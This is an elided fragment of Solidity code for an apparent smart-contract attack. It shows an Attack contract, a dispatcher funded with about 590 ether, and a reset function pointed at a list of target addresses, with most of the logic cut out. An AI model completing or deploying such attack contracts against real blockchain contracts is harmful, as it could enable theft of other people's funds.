 ...
 * parameter. Make sure to send at least 590 ether and 295810358705651713 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x200000000000000000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x200000000000000001; /* equals 590 ether and 295810358705651713 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 590295810358705651712 }(0, _targets);
    }
